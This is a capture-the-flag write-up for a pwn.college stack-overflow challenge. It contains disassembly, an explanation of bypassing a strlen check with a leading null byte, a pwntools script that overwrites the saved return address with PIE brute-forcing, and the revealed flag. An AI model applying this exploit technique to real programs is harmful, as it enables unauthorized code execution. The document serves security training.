---
Platform: Pwn College
Tittle: String Lengths - Hard
Date & Time: 2026 - 09 - 04 14:24
tags:
  - Challenge
  - PIE
  - Bruteforce
  - ret2win
---
---
## FLAG : `pwn.college{sGiztTU1fE1M3TgGyzO--yP44Mv.dRDMzwiN4kDOyEzW}`

---
## Solution :

Check for file security :
```shell
[*] '/challenge/binary-exploitation-null-write'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
PIE is enabled, so we need to bruteforece a little bit.

Check for functions :
```asm
0x00000000000021e6  win_authed
0x0000000000002303  challenge
0x0000000000002460  main
```

Check for ASM code : 

> [!example]- Challenge ASM Code
> ```asm
> Dump of assembler code for function challenge:
   0x0000000000002303 <+0>:	endbr64
   0x0000000000002307 <+4>:	push   rbp
   0x0000000000002308 <+5>:	mov    rbp,rsp
   0x000000000000230b <+8>:	add    rsp,0xffffffffffffff80
   0x000000000000230f <+12>:	mov    DWORD PTR [rbp-0x64],edi
   0x0000000000002312 <+15>:	mov    QWORD PTR [rbp-0x70],rsi
   0x0000000000002316 <+19>:	mov    QWORD PTR [rbp-0x78],rdx
   0x000000000000231a <+23>:	mov    QWORD PTR [rbp-0x60],0x0
   0x0000000000002322 <+31>:	mov    QWORD PTR [rbp-0x58],0x0
   0x000000000000232a <+39>:	mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000002332 <+47>:	mov    QWORD PTR [rbp-0x48],0x0
   0x000000000000233a <+55>:	mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000002342 <+63>:	mov    QWORD PTR [rbp-0x38],0x0
   0x000000000000234a <+71>:	mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000002352 <+79>:	mov    BYTE PTR [rbp-0x28],0x0
   0x0000000000002356 <+83>:	mov    QWORD PTR [rbp-0x8],0x0
   0x000000000000235e <+91>:	mov    QWORD PTR [rbp-0x8],0x1000
   0x0000000000002366 <+99>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000000236a <+103>:	mov    rdi,rax
   0x000000000000236d <+106>:	call   0x11b0 <malloc@plt>
   0x0000000000002372 <+111>:	mov    QWORD PTR [rbp-0x10],rax
   0x0000000000002376 <+115>:	cmp    QWORD PTR [rbp-0x10],0x0
   0x000000000000237b <+120>:	jne    0x239c <challenge+153>
   0x000000000000237d <+122>:	lea    rcx,[rip+0xe3c]        # 0x31c0 <__PRETTY_FUNCTION__.5713>
   0x0000000000002384 <+129>:	mov    edx,0x49
   0x0000000000002389 <+134>:	lea    rsi,[rip+0xd80]        # 0x3110
   0x0000000000002390 <+141>:	lea    rdi,[rip+0xda5]        # 0x313c
   0x0000000000002397 <+148>:	call   0x1170 <__assert_fail@plt>
   0x000000000000239c <+153>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000023a0 <+157>:	mov    rsi,rax
   0x00000000000023a3 <+160>:	lea    rdi,[rip+0xda6]        # 0x3150
   0x00000000000023aa <+167>:	mov    eax,0x0
   0x00000000000023af <+172>:	call   0x1160 <printf@plt>
   0x00000000000023b4 <+177>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000000023b8 <+181>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000023bc <+185>:	mov    rsi,rax
   0x00000000000023bf <+188>:	mov    edi,0x0
   0x00000000000023c4 <+193>:	call   0x1190 <read@plt>
   0x00000000000023c9 <+198>:	mov    DWORD PTR [rbp-0x14],eax
   0x00000000000023cc <+201>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000023d0 <+205>:	mov    rdi,rax
   0x00000000000023d3 <+208>:	call   0x1150 <strlen@plt>
   0x00000000000023d8 <+213>:	mov    QWORD PTR [rbp-0x20],rax
   0x00000000000023dc <+217>:	cmp    QWORD PTR [rbp-0x20],0x38
   0x00000000000023e1 <+222>:	jbe    0x2402 <challenge+255>
   0x00000000000023e3 <+224>:	lea    rcx,[rip+0xdd6]        # 0x31c0 <__PRETTY_FUNCTION__.5713>
   0x00000000000023ea <+231>:	mov    edx,0x4d
   0x00000000000023ef <+236>:	lea    rsi,[rip+0xd1a]        # 0x3110
   0x00000000000023f6 <+243>:	lea    rdi,[rip+0xd79]        # 0x3176
   0x00000000000023fd <+250>:	call   0x1170 <__assert_fail@plt>
   0x0000000000002402 <+255>:	mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000002405 <+258>:	movsxd rdx,eax
   0x0000000000002408 <+261>:	mov    rcx,QWORD PTR [rbp-0x10]
   0x000000000000240c <+265>:	lea    rax,[rbp-0x60]
   0x0000000000002410 <+269>:	mov    rsi,rcx
   0x0000000000002413 <+272>:	mov    rdi,rax
   0x0000000000002416 <+275>:	call   0x11a0 <memcpy@plt>
   0x000000000000241b <+280>:	cmp    DWORD PTR [rbp-0x14],0x0
   0x000000000000241f <+284>:	jns    0x244d <challenge+330>
   0x0000000000002421 <+286>:	call   0x1120 <__errno_location@plt>
   0x0000000000002426 <+291>:	mov    eax,DWORD PTR [rax]
   0x0000000000002428 <+293>:	mov    edi,eax
   0x000000000000242a <+295>:	call   0x11f0 <strerror@plt>
   0x000000000000242f <+300>:	mov    rsi,rax
   0x0000000000002432 <+303>:	lea    rdi,[rip+0xd57]        # 0x3190
   0x0000000000002439 <+310>:	mov    eax,0x0
   0x000000000000243e <+315>:	call   0x1160 <printf@plt>
   0x0000000000002443 <+320>:	mov    edi,0x1
   0x0000000000002448 <+325>:	call   0x11e0 <exit@plt>
   0x000000000000244d <+330>:	lea    rdi,[rip+0xd60]        # 0x31b4
   0x0000000000002454 <+337>:	call   0x1130 <puts@plt>
   0x0000000000002459 <+342>:	mov    eax,0x0
   0x000000000000245e <+347>:	leave
   0x000000000000245f <+348>:	ret
End of assembler dump.
> ```

> [!example]- win_authed ASM Code
> ```asm
Dump of assembler code for function win_authed:
   0x00000000000021e6 <+0>:	endbr64
   0x00000000000021ea <+4>:	push   rbp
   0x00000000000021eb <+5>:	mov    rbp,rsp
   0x00000000000021ee <+8>:	sub    rsp,0x10
   0x00000000000021f2 <+12>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000000021f5 <+15>:	cmp    DWORD PTR [rbp-0x4],0x1337
   0x00000000000021fc <+22>:	jne    0x2300 <win_authed+282>
   0x0000000000002202 <+28>:	lea    rdi,[rip+0xdff]        # 0x3008
   0x0000000000002209 <+35>:	call   0x1130 <puts@plt>
   0x000000000000220e <+40>:	mov    esi,0x0
   0x0000000000002213 <+45>:	lea    rdi,[rip+0xe0a]        # 0x3024
   0x000000000000221a <+52>:	mov    eax,0x0
   0x000000000000221f <+57>:	call   0x11d0 <open@plt>
   0x0000000000002224 <+62>:	mov    DWORD PTR [rip+0x2e16],eax        # 0x5040 <flag_fd.5701>
   0x000000000000222a <+68>:	mov    eax,DWORD PTR [rip+0x2e10]        # 0x5040 <flag_fd.5701>
   0x0000000000002230 <+74>:	test   eax,eax
   0x0000000000002232 <+76>:	jns    0x2281 <win_authed+155>
   0x0000000000002234 <+78>:	call   0x1120 <__errno_location@plt>
   0x0000000000002239 <+83>:	mov    eax,DWORD PTR [rax]
   0x000000000000223b <+85>:	mov    edi,eax
   0x000000000000223d <+87>:	call   0x11f0 <strerror@plt>
   0x0000000000002242 <+92>:	mov    rsi,rax
   0x0000000000002245 <+95>:	lea    rdi,[rip+0xde4]        # 0x3030
   0x000000000000224c <+102>:	mov    eax,0x0
   0x0000000000002251 <+107>:	call   0x1160 <printf@plt>
   0x0000000000002256 <+112>:	call   0x1180 <geteuid@plt>
   0x000000000000225b <+117>:	test   eax,eax
   0x000000000000225d <+119>:	je     0x2277 <win_authed+145>
   0x000000000000225f <+121>:	lea    rdi,[rip+0xdfa]        # 0x3060
   0x0000000000002266 <+128>:	call   0x1130 <puts@plt>
   0x000000000000226b <+133>:	lea    rdi,[rip+0xe16]        # 0x3088
   0x0000000000002272 <+140>:	call   0x1130 <puts@plt>
   0x0000000000002277 <+145>:	mov    edi,0xffffffff
   0x000000000000227c <+150>:	call   0x11e0 <exit@plt>
   0x0000000000002281 <+155>:	mov    eax,DWORD PTR [rip+0x2db9]        # 0x5040 <flag_fd.5701>
   0x0000000000002287 <+161>:	mov    edx,0x100
   0x000000000000228c <+166>:	lea    rsi,[rip+0x2dcd]        # 0x5060 <flag.5700>
   0x0000000000002293 <+173>:	mov    edi,eax
   0x0000000000002295 <+175>:	call   0x1190 <read@plt>
   0x000000000000229a <+180>:	mov    DWORD PTR [rip+0x2ec0],eax        # 0x5160 <flag_length.5702>
   0x00000000000022a0 <+186>:	mov    eax,DWORD PTR [rip+0x2eba]        # 0x5160 <flag_length.5702>
   0x00000000000022a6 <+192>:	test   eax,eax
   0x00000000000022a8 <+194>:	jg     0x22d6 <win_authed+240>
   0x00000000000022aa <+196>:	call   0x1120 <__errno_location@plt>
   0x00000000000022af <+201>:	mov    eax,DWORD PTR [rax]
   0x00000000000022b1 <+203>:	mov    edi,eax
   0x00000000000022b3 <+205>:	call   0x11f0 <strerror@plt>
   0x00000000000022b8 <+210>:	mov    rsi,rax
   0x00000000000022bb <+213>:	lea    rdi,[rip+0xe1e]        # 0x30e0
   0x00000000000022c2 <+220>:	mov    eax,0x0
   0x00000000000022c7 <+225>:	call   0x1160 <printf@plt>
   0x00000000000022cc <+230>:	mov    edi,0xffffffff
   0x00000000000022d1 <+235>:	call   0x11e0 <exit@plt>
   0x00000000000022d6 <+240>:	mov    eax,DWORD PTR [rip+0x2e84]        # 0x5160 <flag_length.5702>
   0x00000000000022dc <+246>:	cdqe
   0x00000000000022de <+248>:	mov    rdx,rax
   0x00000000000022e1 <+251>:	lea    rsi,[rip+0x2d78]        # 0x5060 <flag.5700>
   0x00000000000022e8 <+258>:	mov    edi,0x1
   0x00000000000022ed <+263>:	call   0x1140 <write@plt>
   0x00000000000022f2 <+268>:	lea    rdi,[rip+0xe11]        # 0x310a
   0x00000000000022f9 <+275>:	call   0x1130 <puts@plt>
   0x00000000000022fe <+280>:	jmp    0x2301 <win_authed+283>
   0x0000000000002300 <+282>:	nop
   0x0000000000002301 <+283>:	leave
   0x0000000000002302 <+284>:	ret
End of assembler dump.
> ```

If we see from `Challenge` function, it use several things : 
- `read(0, rbp-0x10, 0x1000)` *Buffer = rbp-0x10*
- `strlen(Buffer)` --> Should be ≤ `0x38` which is only 56 bytes
- `memcpy(rbp-0x60,rbp-0x10,rbp-0x14)` *rbp-0x14 is The return value of read (buffer length)*

Here is the fun fact, `strlen` will only count the length from the initial buffer untill it meets `\x00`, which is null point. And `read` will consume every `stdin` untill it satisfy the length or it meets `EOF`.
The idea is, to put `\x00` in the beginning of the buffer. Since `read` won't care if there are `\x00` inside the buffer, this could trick the `strlen` checking mechanism.

Let's enumerate for the stack addresses : 
```shell
rbp = 0x7ffea560e170
start_buffer = 0x7ffea560e110 #which is rbp-0x60
ret_address = 0x7ffea560e178 #which is rbp+0x8
```

So, here is the payload :
```python
from pwn import *
context.log_level = 'critical' #to mute any failed attemp
file = ('/challenge/binary-exploitation-null-write')

# Payload Building
rbp = 0x7ffea560e170
start_buffer = 0x7ffea560e110 #which is rbp-0x60
ret_address = 0x7ffea560e178 #which is rbp+0x8

padding = ret_address - start_buffer
payload = b'\x00'*padding + b'\x02\x72' #Thiss will modify the saved ret address

#Write To File?
write('payload',payload)


# Process here
for i in range (0,16) : 
	p = process(file)
	p.send(payload)
	output = p.recvall(timeout=2)
	if b'pwn' in output :
		print(output.decode('utf-8', errors='ignore'))
		break
```

Here is the Result : 
```shell
hacker@binary-exploitation~string-lengths-hard:~$ python3 solve
Send your payload (up to 4096 bytes)!
Goodbye!
You win! Here is your flag:
pwn.college{sGiztTU1fE1M3TgGyzO--yP44Mv.dRDMzwiN4kDOyEzW}
```

---
### Key Takeaways : 
